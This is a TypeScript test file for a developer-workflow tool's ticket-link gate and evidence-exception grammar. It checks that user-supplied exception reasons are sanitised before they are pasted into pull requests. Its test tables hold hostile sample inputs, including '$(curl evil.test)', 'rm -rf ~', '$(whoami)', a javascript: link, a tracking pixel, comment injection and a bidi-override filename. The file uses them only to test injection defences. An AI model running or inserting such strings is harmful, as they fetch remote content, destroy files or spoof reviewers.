/**
 * tests/evidence-policy/ticket-gate.test.ts
 *
 * SDLC-evidence PR3b (#362), phase P3: /implement's ticket-link gate and the
 * evidence-exception flow it opens.
 *
 *   AC-10  /implement asks — record an exception, or stop — after the setup-task
 *          capture and before any Code spawn. An approved exception is written to
 *          the handoff file at once, kept byte-identical across later writes, and
 *          forwarded as `PR_EXCEPTIONS` to every Code spawn that can create the PR,
 *          where code.md's anchored gate re-checks it before pasting.
 *   AC-11  The exception grammar (`evidence_exception()`, define 2 of
 *          `_evidence_policy.mds`) compiles to a line regex that agrees with
 *          code.md's paste gate over a table of valid and hostile lines, and every
 *          line the rendering rules can produce passes that gate.
 *
 * Orchestrator decision (2026-09-25): /code-review and /bug-analysis never gate on
 * a ticket, so only /implement is held here; disposition.test.ts holds the review
 * hosts' side and the "exceptions are /implement-only" arm.
 *
 * Every guard has a named collector, a non-empty-corpus assertion and a known-bad
 * probe run through the same collector (PF-064). The grammar is read out of the
 * partial and out of code.md and EXECUTED, never re-typed here: a hand-copied
 * pattern is a second authority that agrees with the first only until one of them
 * is edited.
 *
 * NOT covered: whether a model renders the reason exactly as the rules say (the
 * closure arm proves the RULES only ever produce admissible lines, not that an
 * orchestrator follows them — code.md's gate is what catches a line that drifted),
 * and GitHub closing keywords written with a full issue URL ("fixes https://…"),
 * which the reason's character set still admits.
 */

import { describe, it, expect } from 'vitest'
import { createRequire } from 'module'
import { readFileSync } from 'fs'
import * as path from 'path'

import {
  ROOT,
  collectOrderViolations,
  isAgentBlock,
  parseFences,
  requireDistFile,
  resolveAgentSource,
  walkFiles,
  type OrderRule,
} from '../helpers.js'
import { RESOLVER_SCRIPT } from './scripted-shim.js'

const PARTIAL_PATH = path.join(ROOT, 'src', 'assets', 'commands', '_partials', '_evidence_policy.mds')
const DEFINE = 'evidence_exception'

/** Transcribed from the script's JSDoc: the policy-file parser and serializer. */
interface PolicyFileApi {
  parsePolicyBytes(buf: Uint8Array | null | undefined): { kind: string; policy?: string }
  serializePolicy(policy: unknown): string | null
}
const RESOLVER = createRequire(import.meta.url)(RESOLVER_SCRIPT) as PolicyFileApi

// ---------------------------------------------------------------------------
// The texts under test
// ---------------------------------------------------------------------------

/** The gate that opens the ask — the canonical `ISSUE_REQUIRED` phrase, led by a label. */
const TICKET_ASK = '**Ticket link, only when `ISSUE_REQUIRED` is `true`:**'
/** The paragraph that writes the rendered section to the handoff file. */
const RECORD = '**Record the exception at once**'
/** The Code-agent spawn opener. */
const CODE_SPAWN = 'Agent(subagent_type="Code")'

function implementMd(): string {
  return requireDistFile('implement.md')
}

function codeMd(): string {
  return resolveAgentSource('code').content
}

/** A define's body, braces unescaped the way the compiler emits them. */
function defineBody(name: string): string {
  const lines = readFileSync(PARTIAL_PATH, 'utf-8').split('\n')
  const start = lines.indexOf(`@define ${name}():`)
  const end = lines.indexOf('@end', start + 1)
  if (start === -1 || end === -1) throw new Error(`${PARTIAL_PATH}: no \`@define ${name}():\` … \`@end\` block`)
  return lines.slice(start + 1, end).join('\n').replace(/\\([{}])/g, '$1')
}

// ---------------------------------------------------------------------------
// AC-10 — the ask sits between the setup-task capture and the first Code spawn
// ---------------------------------------------------------------------------

/**
 * The order /implement's Phase 1 must keep. Every anchor is unique in the built
 * file — collectOrderViolations reports a duplicate rather than guessing.
 */
const IMPLEMENT_ORDER: readonly OrderRule[] = [
  { label: 'the policy resolves before setup-task', before: 'resolve-evidence-policy.cjs', after: 'OPERATION: setup-task' },
  { label: 'setup-task runs before the ask', before: 'OPERATION: setup-task', after: TICKET_ASK },
  { label: 'the ask reads the setup-task capture', before: '**Capture from Git agent output**', after: TICKET_ASK },
  { label: 'the exception is recorded after the ask', before: TICKET_ASK, after: RECORD },
  { label: 'the record precedes Phase 2', before: RECORD, after: '### Phase 2: Implement' },
]

/**
 * Named collector: Code spawns that open before the exception is recorded. The
 * record is the precondition of every PR-creating spawn, so ALL of them — not
 * just the first — must follow it.
 */
function collectCodeSpawnsBeforeRecord(content: string): string[] {
  const record = content.indexOf(RECORD)
  if (record === -1) return ['the exception record paragraph is absent']
  const out: string[] = []
  for (let at = content.indexOf(CODE_SPAWN); at !== -1; at = content.indexOf(CODE_SPAWN, at + CODE_SPAWN.length)) {
    if (at < record) out.push(`a Code spawn at offset ${at} opens before the exception is recorded (offset ${record})`)
  }
  return out
}

/** The 825077e Phase 1 tail (built), quoted verbatim: the capture flows straight into decisions. */
const PHASE1_825077E = [
  '"OPERATION: setup-task',
  'Return the branch setup summary."',
  '```',
  '',
  '**Capture from Git agent output** (used throughout flow):',
  '- `TASK_ID`: The branch name created by Git agent (use as TASK_ID for rest of flow)',
  '',
  '**Load the decisions index.**',
  '',
  '### Phase 2: Implement',
  '',
  'Agent(subagent_type="Code"):',
].join('\n')

describe('AC-10: /implement asks about a missing ticket between setup-task and the first Code spawn', () => {
  it('the Phase 1 order holds, and every Code spawn follows the record', () => {
    const md = implementMd()
    const spawns = md.split(CODE_SPAWN).length - 1
    expect(spawns, 'no Code spawn in implement.md — the order arm reads nothing').toBeGreaterThanOrEqual(5)
    expect(collectOrderViolations('implement.md', md, IMPLEMENT_ORDER)).toEqual([])
    expect(collectCodeSpawnsBeforeRecord(md)).toEqual([])
  })

  it('known-bad probes: the 825077e Phase 1 and a Code spawn seeded above the ask are reported', () => {
    const old = collectOrderViolations('825077e/implement.md', PHASE1_825077E, IMPLEMENT_ORDER)
    expect(old.some(v => v.includes(`after anchor absent: "${TICKET_ASK}"`)), old.join('\n')).toBe(true)
    expect(collectCodeSpawnsBeforeRecord(PHASE1_825077E)).toEqual(['the exception record paragraph is absent'])

    const md = implementMd()
    const seeded = md.replace('**Capture from Git agent output**', `${CODE_SPAWN}:\n\n**Capture from Git agent output**`)
    expect(seeded, 'the seed must land').not.toBe(md)
    expect(collectCodeSpawnsBeforeRecord(seeded)).toHaveLength(1)
  })
})

/** The ask block: from the gate through the record paragraph. */
function askBlock(content: string): string | null {
  const start = content.indexOf(TICKET_ASK)
  const end = content.indexOf(RECORD, start)
  if (start === -1 || end === -1) return null
  const endOfRecord = content.indexOf('\n\n', end)
  return content.slice(start, endOfRecord === -1 ? content.length : endOfRecord)
}

/**
 * Named collector: what the ask block fails to state. Two options exactly —
 * record an exception or stop — because a third "type a ticket" option would need
 * a second `ISSUE_INPUT:` fence, and the setup-task payload is pinned to one.
 */
function collectAskDefects(block: string | null): string[] {
  if (block === null) return ['no ask block (gate through record paragraph)']
  const out: string[] = []
  const need = (what: string, ok: boolean): void => { if (!ok) out.push(what) }
  need('the canonical ISSUE_REQUIRED gate', block.startsWith(TICKET_ASK))
  need('keys on a missing ISSUE_PR_LINK, `(none)` included', /no `ISSUE_PR_LINK` \(absent, or `\(none\)`\)/.test(block))
  need('asks with AskUserQuestion', block.includes('AskUserQuestion'))
  const options = block.split('\n').filter(l => /^- \*\*[^*]+\*\* — /.test(l)).map(l => l.slice(4, l.indexOf('** ')))
  need(`exactly the two options (found: ${options.join(', ')})`, options.join('|') === 'Record an exception|Stop')
  need('a bounded re-ask for an empty reason', /ask for it once more, and stop/.test(block))
  need('the BLOCKED report', block.includes('`BLOCKED (no ticket link)`'))
  need('the created branch and BASE_BRANCH', block.includes('`TASK_ID`') && block.includes('`BASE_BRANCH`'))
  need('the policy-file remedy', block.includes('`.devflow/policy.json`'))
  need('no ISSUE_INPUT: key line (the single-ISSUE_INPUT pin)', !/^\s*ISSUE_INPUT:/m.test(block))
  return out
}

describe('AC-10: the ask offers an exception or a stop, and a stop names its remedy', () => {
  it('the ask block states every part of the contract', () => {
    expect(collectAskDefects(askBlock(implementMd()))).toEqual([])
  })

  it('the policy-file remedy is the canonical standard policy, and it parses', () => {
    const block = askBlock(implementMd())!
    const literal = /`(\{"version":1,[^`]*\})`/.exec(block)?.[1]
    expect(literal, 'the remedy must quote the policy file').toBeDefined()
    expect(`${literal}\n`).toBe(RESOLVER.serializePolicy('standard'))
    expect(RESOLVER.parsePolicyBytes(new TextEncoder().encode(literal!))).toEqual({ kind: 'valid', policy: 'standard' })
  })

  it('known-bad probes: a third option, a missing stop report and a missing block are reported', () => {
    const block = askBlock(implementMd())!
    const third = block.replace('- **Stop** — ', '- **Type a ticket** — give the reference.\n- **Stop** — ')
    expect(collectAskDefects(third).some(d => d.startsWith('exactly the two options'))).toBe(true)
    expect(collectAskDefects(block.replace('`BLOCKED (no ticket link)`', 'an error'))).toEqual(['the BLOCKED report'])
    expect(collectAskDefects(askBlock(PHASE1_825077E))).toEqual(['no ask block (gate through record paragraph)'])
  })
})

// ---------------------------------------------------------------------------
// AC-10 — the handoff file holds the section until the PR exists
// ---------------------------------------------------------------------------

/**
 * Named collector: the persistence clauses implement.md is missing. The section
 * must be written at once, survive every later write byte-identically, and the
 * file may only be deleted once the PR exists — a cleanup before the PR-creating
 * spawn would drop the exception on the floor.
 */
function collectHandoffPersistenceGaps(content: string): string[] {
  const out: string[] = []
  const record = askBlock(content) ?? ''
  const protocol = content.split('\n').find(l => l.startsWith('**Handoff Protocol**')) ?? ''
  const handoff = '`.devflow/docs/handoff-{branch_slug}.md`'
  if (!record.includes(`section of ${handoff}`)) out.push('record: the section is not written to the handoff file')
  if (!record.includes('before any Code spawn')) out.push('record: not written before any Code spawn')
  if (!record.includes('keeps the section byte-identical')) out.push('record: later writes may drop the section')
  if (!record.includes('deleted only once the PR exists')) out.push('record: the file may be deleted before the PR exists')
  if (!protocol.includes('keeping any `## Evidence Exceptions` section byte-identical')) {
    out.push('Handoff Protocol: a phase-summary write may drop the section')
  }
  if (!protocol.includes('once the PR exists')) out.push('Handoff Protocol: cleanup is not tied to the PR existing')
  return out
}

/** The 825077e Handoff Protocol sentence (built), quoted verbatim. */
const HANDOFF_PROTOCOL_825077E =
  '**Handoff Protocol**: Each sequential Code agent receives the prior Code agent\'s implementation summary via ' +
  'PRIOR_PHASE_SUMMARY and FILES_FROM_PRIOR_PHASE. The Code agent\'s built-in branch orientation step handles git ' +
  'log scanning, file reading, and pattern discovery automatically. After each Code agent with HANDOFF_REQUIRED=true ' +
  'completes, write its phase summary to `.devflow/docs/handoff-{branch_slug}.md` using the Write tool (survives ' +
  'context compaction). Delete `.devflow/docs/handoff-{branch_slug}.md` after the final Code agent completes (cleanup).'

describe('AC-10: the exception survives in the handoff file until the PR exists', () => {
  it('the record paragraph and the Handoff Protocol state every persistence clause', () => {
    expect(collectHandoffPersistenceGaps(implementMd())).toEqual([])
  })

  it('known-bad probe: the 825077e Handoff Protocol is reported', () => {
    const md = implementMd()
    const current = md.split('\n').find(l => l.startsWith('**Handoff Protocol**'))!
    expect(collectHandoffPersistenceGaps(md.replace(current, HANDOFF_PROTOCOL_825077E))).toEqual([
      'Handoff Protocol: a phase-summary write may drop the section',
      'Handoff Protocol: cleanup is not tied to the PR existing',
    ])
  })
})

// ---------------------------------------------------------------------------
// AC-10 — every PR-creating Code spawn forwards PR_EXCEPTIONS
// ---------------------------------------------------------------------------

/** The value every forwarding line carries: the handoff section verbatim, or `(none)`. */
const FORWARD_LINE =
  'PR_EXCEPTIONS: {the ## Evidence Exceptions section of .devflow/docs/handoff-{branch_slug}.md verbatim, or (none)}'

/**
 * Named collector: Code spawns that can create the PR (`CREATE_PR: true`, or the
 * sequential `CREATE_PR: {true if last …}`) and do not forward `PR_EXCEPTIONS`.
 * Returns the violations and how many PR-creating spawns were read.
 */
function collectUnforwardedExceptions(content: string): { creating: number; violations: string[] } {
  let creating = 0
  const violations: string[] = []
  parseFences(content).forEach((fence, i) => {
    if (!isAgentBlock(fence, 'Code')) return
    if (!/^\s*"?CREATE_PR: (?:true\b|\{true if last)/m.test(fence)) return
    creating++
    const lines = fence.split('\n').map(l => l.replace(/"$/, ''))
    if (!lines.includes(FORWARD_LINE)) violations.push(`fence ${i + 1}: a PR-creating Code spawn without "${FORWARD_LINE}"`)
  })
  return { creating, violations }
}

describe('AC-10: PR_EXCEPTIONS reaches every Code spawn that can create the PR', () => {
  it('SINGLE, SEQUENTIAL Phase 2+ and PARALLEL pr-create all forward the handoff section', () => {
    const { creating, violations } = collectUnforwardedExceptions(implementMd())
    expect(creating, 'fewer PR-creating Code spawns than SINGLE + SEQUENTIAL + pr-create').toBeGreaterThanOrEqual(3)
    expect(violations).toEqual([])
  })

  it('known-bad probe: a spawn that lost the key is reported', () => {
    const md = implementMd()
    const seeded = md.replace(`\n${FORWARD_LINE}`, '')
    expect(seeded, 'the seed must land').not.toBe(md)
    expect(collectUnforwardedExceptions(seeded).violations).toHaveLength(1)
  })

  it('code.md declares PR_EXCEPTIONS as an input and as a pr-create input', () => {
    const code = codeMd()
    expect(code).toContain('- **PR_EXCEPTIONS** (optional):')
    const mode = code.slice(code.indexOf('## Mode: pr-create'))
    const inputs = mode.split('\n').find(l => l.startsWith('**Inputs:**'))
    expect(inputs, 'the pr-create Inputs line').toBeDefined()
    expect(inputs).toContain('`PR_EXCEPTIONS`')
  })
})

// ---------------------------------------------------------------------------
// AC-11 — the exception grammar, read from the partial and from code.md, executed
// ---------------------------------------------------------------------------

/** What define 2 states about each placeholder, parsed out of its bullets. */
interface ExceptionSpec {
  readonly template: string
  readonly kinds: readonly string[]
  readonly login: string
  readonly loginFallback: string
  readonly utcFormat: string
  readonly removed: readonly string[]
  readonly reasonMax: number
}

/** Every code span of a text, double-backtick spans included (`` ` `` → a backtick). */
function codeSpans(text: string): string[] {
  return [...text.matchAll(/``\s(.+?)\s``|`([^`]+)`/g)].map(m => m[1] ?? m[2])
}

/**
 * The bullet of define 2 that describes one placeholder. Read only BELOW the
 * template fence: the template line itself also opens with "- `<kind>`".
 */
function bullet(body: string, head: string): string {
  const fenceEnd = body.indexOf('```', body.indexOf('```markdown') + 3)
  const rules = fenceEnd === -1 ? '' : body.slice(fenceEnd + 3)
  const line = rules.split('\n').find(l => l.startsWith(`- \`${head}\``))
  if (line === undefined) throw new Error(`define ${DEFINE}: no bullet for ${head}`)
  return line
}

/** Parse define 2 into its template and placeholder rules. Throws on a shape it cannot read. */
function parseExceptionSpec(body: string): ExceptionSpec {
  const fence = /```markdown\n([\s\S]*?)```/.exec(body)
  if (fence === null) throw new Error(`define ${DEFINE}: no \`\`\`markdown template fence`)
  const [heading, template] = fence[1].split('\n')
  if (heading !== '## Evidence Exceptions') throw new Error(`define ${DEFINE}: template heading is "${heading}"`)

  const kind = bullet(body, '<kind>')
  const kinds = codeSpans(kind.slice(kind.indexOf(' is one of '), kind.indexOf(' — ')))

  const login = bullet(body, '@<login>')
  const pattern = codeSpans(login).find(c => c.startsWith('^') && c.endsWith('$'))
  const fallback = /it is `([^`]+)` instead/.exec(login)?.[1]
  if (pattern === undefined || fallback === undefined) throw new Error(`define ${DEFINE}: unreadable login rule`)

  const utc = codeSpans(bullet(body, '<utc>')).find(c => c.startsWith('date -u +'))
  if (utc === undefined) throw new Error(`define ${DEFINE}: unreadable utc rule`)

  const reason = bullet(body, '<reason>')
  const removedAt = reason.indexOf('remove every ')
  const removed = codeSpans(reason.slice(removedAt, reason.indexOf(', collapse', removedAt)))
  const max = /keep the first (\d+) characters/.exec(reason)?.[1]
  if (removedAt === -1 || removed.length === 0 || max === undefined) throw new Error(`define ${DEFINE}: unreadable reason rule`)

  return {
    template,
    kinds,
    login: pattern.slice(1, -1),
    loginFallback: fallback,
    utcFormat: utc.slice('date -u +'.length),
    removed,
    reasonMax: Number(max),
  }
}

function escapeRe(text: string): string {
  return text.replace(/[.*+?^${}()|[\]\\/-]/g, '\\$&')
}

/** The printable ASCII characters a rendered reason may carry, space excluded. */
function reasonChars(spec: ExceptionSpec): string[] {
  return Array.from({ length: 0x7e - 0x21 + 1 }, (_, i) => String.fromCharCode(0x21 + i)).filter(c => !spec.removed.includes(c))
}

/** A strftime format as a regex: every conversion is a fixed-width digit run. */
function strftimeRe(format: string): string {
  const widths: Record<string, number> = { Y: 4, m: 2, d: 2, H: 2, M: 2, S: 2 }
  return format.replace(/%([YmdHMS])|([^%])/g, (_, conv: string | undefined, lit: string | undefined) =>
    conv !== undefined ? `[0-9]{${widths[conv]}}` : escapeRe(lit!))
}

/** Compile define 2's template into a whole-line RegExp. */
function compileExceptionTemplate(spec: ExceptionSpec): RegExp {
  const cls = `[${reasonChars(spec).map(escapeRe).join('')}]`
  const withSpace = `[ ${reasonChars(spec).map(escapeRe).join('')}]`
  const parts: Record<string, string> = {
    '<kind>': `(?:${spec.kinds.map(escapeRe).join('|')})`,
    '@<login>': `(?:@${spec.login}|${escapeRe(spec.loginFallback)})`,
    '<utc>': strftimeRe(spec.utcFormat),
    '<reason>': `${cls}${withSpace}{0,${spec.reasonMax - 1}}`,
  }
  let out = escapeRe(spec.template)
  for (const [placeholder, src] of Object.entries(parts)) {
    const escaped = escapeRe(placeholder)
    if (!out.includes(escaped)) throw new Error(`template has no ${placeholder}`)
    out = out.split(escaped).join(src)
  }
  return new RegExp(`^${out}$`)
}

/** code.md's paste gate: the first line of the fence under its PR_EXCEPTIONS paragraph. */
function codeGate(code: string): RegExp {
  const at = code.indexOf('**Pasting `PR_EXCEPTIONS`.**')
  if (at === -1) throw new Error('code.md has no PR_EXCEPTIONS paste paragraph')
  const fence = /```\n\s*(\^[^\n]+\$)\n\s*```/.exec(code.slice(at))
  if (fence === null) throw new Error('code.md: no anchored pattern fence under the PR_EXCEPTIONS paragraph')
  return new RegExp(fence[1])
}

const UTC = '2026-09-25T21:00:00Z'
const line = (login: string, reason: string, kind = 'ticket-link', utc = UTC): string =>
  `- \`${kind}\` self-attested by ${login} at ${utc}: ${reason}`

/** The grammar table: valid lines, and hostile near-misses every gate must refuse. */
const GRAMMAR_TABLE: ReadonlyArray<{ readonly label: string; readonly value: string; readonly valid: boolean }> = [
  { label: 'a normal line', value: line('@octocat', 'hotfix for a prod outage, ticket to follow'), valid: true },
  { label: 'login unavailable', value: line('(login unavailable)', 'no tracker access from CI'), valid: true },
  { label: 'a 39-character login', value: line(`@${'a'.repeat(39)}`, 'ok'), valid: true },
  { label: 'a 200-character reason', value: line('@octocat', 'r'.repeat(200)), valid: true },
  { label: 'a hyphenated login', value: line('@octo-cat', 'N/A (spike)'), valid: true },
  { label: 'a login with `_`', value: line('@octo_cat', 'x'), valid: false },
  { label: 'a 40-character login', value: line(`@${'a'.repeat(40)}`, 'x'), valid: false },
  { label: 'a login starting with `-`', value: line('@-octo', 'x'), valid: false },
  { label: '`@` before the fallback', value: line('@(login unavailable)', 'x'), valid: false },
  { label: 'a missing `Z`', value: line('@octocat', 'x', 'ticket-link', '2026-09-25T21:00:00'), valid: false },
  { label: 'a reason with a newline', value: line('@octocat', 'first\nsecond'), valid: false },
  { label: 'a reason with `<!--`', value: line('@octocat', 'x <!-- devflow:review-summary -->'), valid: false },
  { label: 'a 201-character reason', value: line('@octocat', 'r'.repeat(201)), valid: false },
  { label: 'kind `test-plan`', value: line('@octocat', 'x', 'test-plan'), valid: false },
  { label: 'a mention', value: line('@octocat', 'approved by @lead'), valid: false },
  { label: 'an issue reference', value: line('@octocat', 'fixes #12'), valid: false },
  { label: 'a markdown link', value: line('@octocat', '[click](https://x.test)'), valid: false },
  { label: 'a command substitution', value: line('@octocat', '$(whoami)'), valid: false },
  { label: 'a backtick', value: line('@octocat', 'a `b` c'), valid: false },
  { label: 'an entity', value: line('@octocat', '&#35;12'), valid: false },
  { label: 'a bidi override', value: line('@octocat', 'safe‮txt.exe'), valid: false },
  { label: 'an empty reason', value: line('@octocat', ''), valid: false },
  { label: 'a leading-space reason', value: line('@octocat', ' x'), valid: false },
  { label: 'trailing text on a second line', value: `${line('@octocat', 'x')}\nCloses #1`, valid: false },
]

/** Named collector: table rows a gate decides differently from the table. */
function collectGrammarMisses(gate: RegExp, rows = GRAMMAR_TABLE): string[] {
  return rows
    .filter(r => gate.test(r.value) !== r.valid)
    .map(r => `${r.label}: ${gate.test(r.value) ? 'accepted' : 'rejected'} ${JSON.stringify(r.value.slice(0, 80))}`)
}

/** Define 2, parsed on use — a parse failure fails the arm that needed it, not the whole file. */
const exceptionSpec = (): ExceptionSpec => parseExceptionSpec(defineBody(DEFINE))

describe('AC-11: the exception grammar — define 2 and code.md\'s gate agree, and both refuse the hostile rows', () => {
  it('define 2 parses into the documented rules', () => {
    const spec = exceptionSpec()
    expect(spec.kinds, 'the kind set is closed to ticket-link in #362').toEqual(['ticket-link'])
    expect(spec.login).toBe('[A-Za-z0-9][A-Za-z0-9-]{0,38}')
    expect(spec.loginFallback).toBe('(login unavailable)')
    expect(spec.utcFormat).toBe('%Y-%m-%dT%H:%M:%SZ')
    expect(spec.reasonMax).toBe(200)
    for (const c of ['<', '>', '`', '[', ']', '\\', '#', '@', '&', '$']) expect(spec.removed, `removes ${c}`).toContain(c)
  })

  it('the template compiled from define 2 decides every table row as the table says', () => {
    expect(GRAMMAR_TABLE.filter(r => r.valid).length).toBeGreaterThanOrEqual(3)
    expect(GRAMMAR_TABLE.filter(r => !r.valid).length).toBeGreaterThanOrEqual(15)
    expect(collectGrammarMisses(compileExceptionTemplate(exceptionSpec()))).toEqual([])
  })

  it('code.md\'s anchored paste gate decides every table row as the table says', () => {
    const gate = codeGate(codeMd())
    expect(gate.source.startsWith('^') && gate.source.endsWith('$'), 'the gate must anchor both ends').toBe(true)
    expect(collectGrammarMisses(gate)).toEqual([])
  })

  it('known-bad probes: a widened kind set, an unanchored gate and a gate missing a removed character are reported', () => {
    const spec = exceptionSpec()
    const widened = compileExceptionTemplate({ ...spec, kinds: [...spec.kinds, 'test-plan'] })
    expect(collectGrammarMisses(widened).some(m => m.startsWith('kind `test-plan`'))).toBe(true)
    const unanchored = new RegExp(codeGate(codeMd()).source.slice(0, -1))
    expect(collectGrammarMisses(unanchored).some(m => m.startsWith('trailing text on a second line'))).toBe(true)
    const leaky = compileExceptionTemplate({ ...spec, removed: spec.removed.filter(c => c !== '#') })
    expect(collectGrammarMisses(leaky).some(m => m.startsWith('an issue reference'))).toBe(true)
  })
})

/** Render a raw reason by define 2's rules. */
function renderReason(raw: string, spec: ExceptionSpec): string {
  const printable = [...raw].map(c => (c >= ' ' && c <= '~' ? c : ' ')).join('')
  const stripped = [...printable].filter(c => !spec.removed.includes(c)).join('')
  return stripped.replace(/ {2,}/g, ' ').trim().slice(0, spec.reasonMax).trim()
}

/** Render the requester by define 2's rules. */
function renderLogin(output: string, spec: ExceptionSpec): string {
  return new RegExp(`^${spec.login}$`).test(output) ? `@${output}` : spec.loginFallback
}

/** Hostile raw inputs a user, or text injected into the orchestrator, could supply. */
const RAW_REASONS: readonly string[] = [
  'hotfix\nCloses #1\n<!-- devflow:resolution-summary -->',
  '`rm -rf ~` $(curl evil.test) ${HOME}',
  '![pixel](https://evil.test/p.png) [x](javascript:alert(1)) @everyone @org/team',
  'fixes #12, owner/repo#3, &#35;4',
  'safe‮txt.exe​\ttabbed\r\nwindows',
  `${'long '.repeat(80)}tail`,
  '   \n\t  ',
]

/**
 * Named collector: rendered lines code.md's gate refuses, or that still carry a
 * character the grammar forbids. `forbidden` is passed separately from the render
 * rules so a probe can render with a forgetful rule set and still see the leak.
 */
function collectInadmissibleRenders(
  spec: ExceptionSpec,
  gate: RegExp,
  raws: readonly string[],
  forbidden: readonly string[] = spec.removed,
): string[] {
  const out: string[] = []
  for (const raw of raws) {
    const reason = renderReason(raw, spec)
    if (reason === '') continue // "no reason": the ask repeats, then stops — nothing is rendered
    const rendered = line(renderLogin('octocat', spec), reason)
    if (!gate.test(rendered)) out.push(`refused: ${JSON.stringify(rendered.slice(0, 100))}`)
    const leaked = forbidden.filter(c => reason.includes(c))
    if (leaked.length > 0) out.push(`leaked ${leaked.join(' ')}: ${JSON.stringify(reason.slice(0, 60))}`)
  }
  return out
}

describe('AC-11: every line the rendering rules can produce passes code.md\'s gate', () => {
  it('hostile raw reasons render to admissible, inert lines; a blank reason renders to none', () => {
    const spec = exceptionSpec()
    const gate = codeGate(codeMd())
    expect(RAW_REASONS.length).toBeGreaterThanOrEqual(5)
    expect(collectInadmissibleRenders(spec, gate, RAW_REASONS)).toEqual([])
    expect(renderReason('   \n\t  ', spec), 'a blank reason is no reason').toBe('')
    expect(renderReason(`${'long '.repeat(80)}tail`, spec).length).toBeLessThanOrEqual(spec.reasonMax)
  })

  it('a login outside the pattern, or a failed lookup, renders the fallback', () => {
    const spec = exceptionSpec()
    for (const hostile of ['octo_cat', 'a'.repeat(40), 'evil\n@x', '', '-lead']) {
      expect(renderLogin(hostile, spec), JSON.stringify(hostile)).toBe('(login unavailable)')
    }
    expect(renderLogin('octocat', spec)).toBe('@octocat')
  })

  it('known-bad probe: a render rule that forgot a character leaks it and is refused', () => {
    const spec = exceptionSpec()
    const gate = codeGate(codeMd())
    const forgetful = { ...spec, removed: spec.removed.filter(c => c !== '@') }
    const found = collectInadmissibleRenders(forgetful, gate, ['approved by @lead'], spec.removed)
    expect(found.some(f => f.startsWith('refused:'))).toBe(true)
    expect(found.some(f => f.startsWith('leaked @'))).toBe(true)
  })
})

// ---------------------------------------------------------------------------
// code.md — the paste paragraph sits inside Responsibility 7, before the scrub
// ---------------------------------------------------------------------------

/**
 * The three code.md lines the frozen github-status-lines fixture samples by
 * first match. The paste paragraph must not duplicate them, or a sampler could
 * pick up the new text.
 */
const FROZEN_CODE_ANCHORS = [
  '| Related Issues (ISSUE_NUMBER provided) |',
  'When `ISSUE_NUMBER` is provided, always include',
  '**D11 scrub (PR body is a GitHub-visible sink):**',
] as const

const CODE_ORDER: readonly OrderRule[] = [
  { label: 'the exception gate follows the link gate', before: 'This re-check is the only gate on that value', after: '**Pasting `PR_EXCEPTIONS`.**' },
  { label: 'the exception gate precedes the D11 scrub', before: '**Pasting `PR_EXCEPTIONS`.**', after: FROZEN_CODE_ANCHORS[2] },
]

/** Named collector: what code.md's PR_EXCEPTIONS paragraph fails to state. */
function collectPasteParagraphDefects(code: string): string[] {
  const at = code.indexOf('**Pasting `PR_EXCEPTIONS`.**')
  if (at === -1) return ['no PR_EXCEPTIONS paste paragraph']
  const para = code.slice(at, code.indexOf(FROZEN_CODE_ANCHORS[2], at))
  const out: string[] = []
  if (!para.includes('first line must be exactly `## Evidence Exceptions`')) out.push('the heading is not pinned')
  if (!para.includes('as the WHOLE line')) out.push('the pattern is not a whole-line match')
  if (!/`\(none\)`, or absent, is \*\*not a mismatch\*\*/.test(para)) out.push('`(none)` is not the documented absent case')
  if (!para.includes('`TRACEABILITY: DEGRADED (evidence exception does not match its grammar)`')) out.push('no DEGRADED reason')
  if (!para.includes('paste none of it and do not repair it')) out.push('a mismatch may be repaired or partly pasted')
  if (!para.includes('minimal body below never carries the section')) out.push('the scrubber-failure body may carry it')
  return out
}

describe('code.md: the PR_EXCEPTIONS paste gate', () => {
  it('sits between the link gate and the D11 scrub, and leaves the frozen anchors unique', () => {
    const code = codeMd()
    expect(collectOrderViolations('code.md', code, CODE_ORDER)).toEqual([])
    for (const anchor of FROZEN_CODE_ANCHORS) expect(code.split(anchor).length - 1, anchor).toBe(1)
  })

  it('states the heading pin, the whole-line match, the absent case and the refusal', () => {
    expect(collectPasteParagraphDefects(codeMd())).toEqual([])
  })

  it('known-bad probe: a paragraph that repairs a mismatch is reported', () => {
    const code = codeMd()
    const seeded = code.replace('paste none of it and do not repair it', 'repair it and paste it')
    expect(seeded, 'the seed must land').not.toBe(code)
    expect(collectPasteParagraphDefects(seeded)).toEqual(['a mismatch may be repaired or partly pasted'])
  })
})

// ---------------------------------------------------------------------------
// define 2 is /implement's alone in #362
// ---------------------------------------------------------------------------

/** Named collector: the src .mds files that import or call `evidence_exception`. */
function collectExceptionUsers(sources: ReadonlyArray<{ name: string; content: string }>): string[] {
  return sources
    .filter(s => s.name !== '_evidence_policy')
    .filter(s => /^@import\b[^\n]*\bevidence_exception\b/m.test(s.content) || s.content.includes(`{${DEFINE}()}`))
    .map(s => s.name)
    .sort()
}

describe('the exception grammar has one caller in #362: /implement', () => {
  it('only implement.mds imports and calls evidence_exception()', () => {
    const sources = walkFiles(path.join(ROOT, 'src'), f => f.endsWith('.mds')).map(f => ({
      name: path.basename(f, '.mds'),
      content: readFileSync(f, 'utf-8'),
    }))
    expect(sources.length, 'the src/ .mds walk found nothing').toBeGreaterThanOrEqual(20)
    expect(collectExceptionUsers(sources)).toEqual(['implement'])
  })

  it('known-bad probe: a second caller is reported', () => {
    expect(collectExceptionUsers([
      { name: 'implement', content: `{${DEFINE}()}` },
      { name: 'code-review', content: `@import { ${DEFINE} } from "./_partials/_evidence_policy.mds"` },
    ])).toEqual(['code-review', 'implement'])
  })
})
